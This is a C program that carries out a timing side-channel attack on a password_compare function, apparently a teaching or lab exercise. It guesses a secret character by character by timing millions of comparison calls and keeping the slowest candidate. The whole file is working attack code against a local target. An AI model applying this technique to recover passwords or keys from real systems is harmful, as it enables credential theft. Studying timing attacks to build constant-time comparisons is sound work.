#include <stdio.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include "timing.h"

#define LENGTH 20

const char * symbols = "abcdefghijklmnopqrstuvwxyz"
                       "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                       "0123456789"
                       "!@#$%^&*()-_=+[]{}|/?.,<>;:'\"\\`~ ";

int main(void) {
    const size_t len = strlen(symbols);
    clock_t * times = (clock_t *) calloc(len, sizeof(clock_t));

    clock_t start, stop;
    char secret[LENGTH] = {'a'};

    int res = 0;

    for (uint32_t i = 0; i < LENGTH; i++) {
        printf("i: %u\n", i);
        for (uint64_t j = 0; j < len; j++) {
            secret[i] = symbols[j];

            start = clock();
            for (uint64_t k = 0; k < 10000000; k++) {
                res = password_compare(secret);
            }
            stop = clock();
            times[j] = stop - start;
            if (res != -1) {
                printf("compare fct returned != -1; pw might be: %s\n", secret);
            }
        }
        
        secret[i] = symbols[time_max(times, len)];
        printf("pw so far: %s\n", secret);
    }

    printf("timing attack says: %s\n", secret);
    printf("password_compare says: %d\n", password_compare(secret));

    free(times);

    return EXIT_SUCCESS;
}

/* return the index holding the highest element */
size_t time_max(clock_t * arr, size_t len) {
    clock_t max = 0;
    size_t res = 0;

    for (size_t i = 0; i < len; i++) {
        if (arr[i] > max) {
            max = arr[i];
            res = i;
        }
    }
    return res;
}
